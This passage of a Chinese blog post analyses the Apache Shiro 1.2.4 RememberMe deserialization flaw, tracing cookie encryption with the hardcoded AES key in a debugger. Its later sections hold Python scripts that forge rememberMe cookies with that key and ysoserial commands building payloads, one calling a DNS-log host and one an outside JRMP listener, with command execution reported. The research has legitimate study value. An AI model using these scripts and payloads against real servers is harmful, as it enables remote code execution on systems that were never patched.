&#123;</span><br><span class="line">            log.info(<span class="string">&quot;Hello, mere mortal.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//test a typed permission (not instance-level)</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.isPermitted(<span class="string">&quot;lightsaber:wield&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;You may use a lightsaber ring.  Use it wisely.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Sorry, lightsaber rings are for schwartz masters only.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//a (very powerful) Instance Level permission:</span></span><br><span class="line">        <span class="keyword">if</span> (currentUser.isPermitted(<span class="string">&quot;winnebago:drive:eagle5&quot;</span>)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;You are permitted to &#x27;drive&#x27; the winnebago with license plate (id) &#x27;eagle5&#x27;.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Here are the keys - have fun!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;Sorry, you aren&#x27;t allowed to drive the &#x27;eagle5&#x27; winnebago!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//all done - log out!</span></span><br><span class="line">        currentUser.logout();</span><br><span class="line"></span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Demo中对session和用户的登录，角色，权限进行了测试，对照运行的输出<br><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321145837383.png" alt="image-20200321145837383"></p>
+<h2 id="动调环境搭建"><a href="#动调环境搭建" class="headerlink" title="动调环境搭建"></a>动调环境搭建</h2><p>下载Shiro并切换到漏洞版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
+
+<p>编辑shiro&#x2F;samples&#x2F;web&#x2F;pom.xml文件</p>
+<p>jstl是为了Demo正常运行，否则无法识别jsp标签</p>
+<p>commons-collections4是配合shiro反序列化点组成一条完整的利用链</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后用idea导入shiro&#x2F;samples&#x2F;web项目，等待idea自动下载导入项目依赖的包</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321161842461.png" alt="image-20200321161842461"></p>
+<p>然后Run -&gt; Edit Configurations 添加TomcatServer</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162413295.png" alt="image-20200321162413295"></p>
+<p>设置Tomcat路径并添加Artifact</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162537299.png" alt="image-20200321162537299"></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162602475.png" alt="image-20200321162602475"></p>
+<p>然后就可以调试运行了</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162720187.png" alt="image-20200321162720187"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">[SHIRO-550] Randomize default remember me cipher - ASF JIRA</a>的描述已经比较清楚了</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321163758120.png" alt="image-20200321163758120"></p>
+<ul>
+<li>检索<code>RememberMe</code> cookie 的值</li>
+<li>Base 64解码</li>
+<li>使用AES解密</li>
+<li>使用Java序列化（<code>ObjectInputStream</code>）反序列化</li>
+</ul>
+<p>在登录时勾选<code>RememberMe</code></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170531049.png" alt="image-20200321170531049"></p>
+<p>然后cookie中就会储存<code>RememberMe</code>键值对</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170728781.png" alt="image-20200321170728781"></p>
+<p>解密AES需要密钥还有mode（加解密算法）和 IV（初始化向量），而由官网得知<code>RememberMe</code>在CookieRememberMeManager实现</p>
+<p>idea中ctrl+n搜索该类名可以快速定位</p>
+<p>org.apache.shiro.web.mgt.CookieRememberMeManager</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321172033719.png" alt="image-20200321172033719"></p>
+<p>该类继承自AbstractRememberMeManager</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321174309740.png" alt="image-20200321174309740"></p>
+<p>很容易发现默认的Key是硬编码在其中的，这也是该反序列得以利用的关键，如果再确定mode和IV则可以构造<code>RememberMe</code>的值，然后让其反序列化</p>
+<h3 id="序列化、加密过程"><a href="#序列化、加密过程" class="headerlink" title="序列化、加密过程"></a>序列化、加密过程</h3><p>在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin下断点，然后开始Debug</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201103424.png" alt="image-20200321201103424"></p>
+<p>在登录界面勾选Remember Me并登录</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201229223.png" alt="image-20200321201229223"></p>
+<p>登录成功即会在onSuccessfulLogin断点处停下</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201833615.png" alt="image-20200321201833615"></p>
+<p>85行则对rememberMe的值进行判断，如果登录时勾选了则为true，然后进入</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202502782.png" alt="image-20200321202502782"></p>
+<p>94行获取身份即 root，然后进入</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202614429.png" alt="image-20200321202614429"></p>
+<p>103行将用户身份转换为byte[]，跟入看一下</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202938567.png" alt="image-20200321202938567"></p>
+<p>在这个函数里将用户身份进行了序列化和加密，最后返回的是密文byte[]</p>
+<p>继续跟入序列化的处理流程的话</p>
+<p>org.apache.shiro.io.DefaultSerializer#serialize</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321203344204.png" alt="image-20200321203344204"></p>
+<p>采用的是java原生的序列化方法writeObject，而最后序列化的数据也就是代表用户身份的SimplePrincipalCollection类的实例，该类实现的接口的父辈接口继承了Serializable接口</p>
+<p>返回去接着看加密过程</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204401719.png" alt="image-20200321204401719"></p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204557024.png" alt="image-20200321204557024"></p>
+<p>154行得到一个用来加密的CipherService对象，跟入会发现返回的是当前类的<code>private CipherService cipherService = new AesCipherService();</code>并且在AesCipherService父类完成CipherService对象的初始化，此时就确定了AES加密方式及mod</p>
+<p>在当前Debug处就可以看到该对象的信息，比如mod，这里采用的是CBC</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205506865.png" alt="image-20200321205506865"></p>
+<p>接着到了156行，cipherService.encrypt方法第一个参数是序列化后的字节数组，第二个参数即是加AES的key</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205933941.png" alt="image-20200321205933941"></p>
+<p>这里的key是在AbstractRememberMeManager类的构造函数里完成初始化，其值就是硬编码的key</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205846991.png" alt="image-20200321205846991"></p>
+<p>跟入cipherService.encrypt</p>
+<p>org.apache.shiro.crypto.JcaCipherService#encrypt</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321210454929.png" alt="image-20200321210454929"></p>
+<p>在147行跟入的话会发现IV是随机生成的，接着在153行，传入this.encrypt的参数分别是序列化数据，AES的key，AES的IV和一个值为true的布尔值，跟入</p>
+<p>org.apache.shiro.crypto.JcaCipherService#encrypt</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212123639.png" alt="image-20200321212123639"></p>
+<p>在162行将16字节的IV放入了output，接着放入密文数据，最后返回Util.bytes(output)</p>
+<p>后面一直return到</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212426443.png" alt="image-20200321212426443"></p>
+<p>加密过程结束</p>
+<p>然后回到</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212650537.png" alt="image-20200321212650537"></p>
+<p>这里可知前文中</p>
+<blockquote>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity103行将用户身份转换为byte[]</p>
+</blockquote>
+<p>的byte[]即为<code>随机16字节IV+AES密文</code></p>
+<p>跟进this.rememberSerializedIdentity</p>
+<p>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321213458543.png" alt="image-20200321213458543"></p>
+<p>其中将前文的<code>随机16字节IV+AES密文</code>byte[]进行了base64编码，并且最后设置成键为rememberMe的Cookie</p>
+<p>可以验证一下确实如此</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321214045866.png" alt="image-20200321214045866"></p>
+<h3 id="解密、反序列化过程"><a href="#解密、反序列化过程" class="headerlink" title="解密、反序列化过程"></a>解密、反序列化过程</h3><p>在org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity打下断点，然后从cookie中删除JSESSIONID只保留rememberMe刷新网页，或者发送只有rememberMe的请求</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321220720903.png" alt="image-20200321220720903"></p>
+<p>cookie等信息都在subjectContext对象中，跟入rmm.getRememberedPrincipals</p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221012855.png" alt="image-20200321221012855"></p>
+<p>跟入this.getRememberedSerializedIdentity</p>
+<p>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221502601.png" alt="image-20200321221502601"></p>
+<p>在其中提取了cookie并进行base64解码</p>
+<p>回到getRememberedPrincipals并跟入this.convertBytesToPrincipals</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221616027.png" alt="image-20200321221616027"></p>
+<p>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221705778.png" alt="image-20200321221705778"></p>
+<p>在137行进行AES解密，跟入的话，其实就是提取前16位作为iv，然后前文的默认key来进行解密</p>
+<p>140行则进行反序列化</p>
+<p>org.apache.shiro.io.DefaultSerializer#deserialize</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321222156614.png" alt="image-20200321222156614"></p>
+<p>看到readObject便就结束了</p>
+<h3 id="cookie解密及伪造脚本"><a href="#cookie解密及伪造脚本" class="headerlink" title="cookie解密及伪造脚本"></a>cookie解密及伪造脚本</h3><h4 id="cookie解密"><a href="#cookie解密" class="headerlink" title="cookie解密"></a>cookie解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode =  AES.MODE_CBC</span><br><span class="line">IV   = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line"><span class="built_in">print</span>(encryptor.decrypt(base64.b64decode(sys.argv[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321224754536.png" alt="image-20200321224754536"></p>
+<p>可以看到从第二行开始就是SimplePrincipalCollection对象的序列化数据</p>
+<p>但脚本中并未使用真正的IV，而是一个错误值，其实在AES CBC解密中IV只会用于对第一个块进行解密，其他块的解密则是使用上一块的加密二进制作为IV进行解密操作，加密的时候，IV会影响所有数据的加密结果，而解密时，IV只会影响第一个加密块的解密结果</p>
+<p>而cookie中的第一段是加密时所用的IV，所以在这里解错并无影响，下文构造cookie时也是由自己随意构造IV就可</p>
+<h4 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode =  AES.MODE_CBC</span><br><span class="line">IV   = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, IV)</span><br><span class="line"></span><br><span class="line">payload=base64.b64decode(sys.argv[<span class="number">1</span>])</span><br><span class="line">BS   = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">payload=pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure>
+
+<p>IV随机生成，序列化的payload用base64格式传入</p>
+<p>生成payload（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lykm02/p/4479098.html">sed去除换行符</a>）</p>
+<p><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39; </code></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235149421.png" alt="image-20200321235149421"></p>
+<p>伪造cookie</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235309952.png" alt="image-20200321235309952"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="DNS-gadget验证漏洞"><a href="#DNS-gadget验证漏洞" class="headerlink" title="DNS gadget验证漏洞"></a>DNS gadget验证漏洞</h3><p>在不知服务器含有哪些组件或者说不知道有哪些可用利用链时，可以ysoserial的URLDNS gadget进行漏洞验证，参数改成dns地址，测试能收到DNS请求。不过Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。URLDNS gadget不需要其他类的支持，它的Gadget Chain：</p>
+<blockquote>
+<p>*   Gadget Chain:<br>*     HashMap.readObject()<br>*       HashMap.putVal()<br>*         HashMap.hash()<br>*           URL.hashCode()</p>
+</blockquote>
+<p><code>java -jar ysoserial-master-30099844c6-1.jar URLDNS &quot;http://dx7yuq.dnslog.cn&quot; |base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000638321.png" alt="image-20200322000638321"></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000820672.png" alt="image-20200322000820672"></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000851697.png" alt="image-20200322000851697"></p>
+<h3 id="commons-collections4"><a href="#commons-collections4" class="headerlink" title="commons-collections4"></a>commons-collections4</h3><p>由于前文搭建环境时已经添加了commons-collections4，所以利用ysoserial的CommonsCollections2即可</p>
+<p><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39; </code></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235751863.png" alt="image-20200321235751863"></p>
+<h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p>运行<code>mvn dependency:list</code>可以查看所有依赖</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322003851696.png" alt="image-20200322003851696"></p>
+<p>其中就有commons-collections3.2.1</p>
+<p>直接用ysoserial生成payload攻击会出错，原因是</p>
+<blockquote>
+<p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
+</blockquote>
+<blockquote>
+<h2 id="What-made-the-ysoserial-payloads-fail"><a href="#What-made-the-ysoserial-payloads-fail" class="headerlink" title="What made the ysoserial payloads fail?"></a><a target="_blank" rel="noopener" href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">What made the ysoserial payloads fail?</a></h2><p>I set up a test environment based on Apache Shiro samples and triggered the ysoserial payloads. Investigating the resulting errors reveals that Shiro uses a buggy classloader that is <strong>unable to deserialize any arrays</strong>. Unfortunately, most ysoserial payloads do contain an array of some sort:</p>
+<ul>
+<li>ChainedTransformer - the chain of transformers inside this object is an array, thus we cannot use ChainedTransformer at all</li>
+<li>InvokerTransformer - the list of arguments given to the function is an array and will fail deserialiation. However, if we give no arguments, (de)serialization succeeds.</li>
+</ul>
+<p>The remaining payloads in ysoserial depend on classes that were not present in our target system :&#x2F; So looks like we cannot give parameters to method calls nor chain method calls to one another. Is all hope of succesful exploitation lost?</p>
+</blockquote>
+<p>解决这种问题的办法是使用JRMP</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322012002559.png" alt="image-20200322012002559"></p>
+<p>我本地测试也未成功，参考其他师傅文章</p>
+<blockquote>
+<p>具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的。</p>
+</blockquote>
+<p>第一次攻击commons-collections3.2.1失败的原因应该就是直接出在maven scope上，因为commons-collections3.2.1的scope是test，编译运行时根本不存在</p>
+<p>那现在手动加入commons-collections3.2.1，就会覆盖其父配置，让scope不为test</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>继续尝试使用JRMP的方法攻击</p>
+<p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient &quot;x.x.x.x:12345&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322135132673.png" alt="image-20200322135132673"></p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133230697.png" alt="image-20200322133230697"></p>
+<p>服务器开启监听并发送payload</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133300379.png" alt="image-20200322133300379"></p>
+<p>这次确实成功执行命令</p>
+<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133333045.png" alt="image-20200322133333045"></p>
+<p>那么再尝试直接用CommonsCollections5 gadget</p>
+<p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &quot;calc&quot; |base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
+<p>失败，这次失败的原因才是如上文</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/WUXIAOCHANG/p/10886534.html">权限框架之Shiro详解</a></p>
+<p><a target="_blank" rel="noopener" href="http://saucer-man.com/information_security/396.html">分析调试apache shiro反序列化漏洞(CVE-2016-4437)</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/shiro-rememberme-1-2-4">【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">[SHIRO-550] Randomize default remember me cipher - ASF JIRA</a></p>
+<p><a target="_blank" rel="noopener" href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html">Apache Shiro Java反序列化漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/45848dd484a9">关于AES加解密中CBC模式的IV初始化向量的安全性问题</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a></p>
+<p><a target="_blank" rel="noopener" href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">Exploiting JVM deserialization vulns despite a broken class loader</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/35">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考</a></p>
+<p><a target="_blank" rel="noopener" href="http://redteam.today/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">shiro 反序列化复现</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag"># Java反序列化漏洞</a>
+              <a href="/tags/Shiro/" rel="tag"># Shiro</a>
+          </div>
+
+        
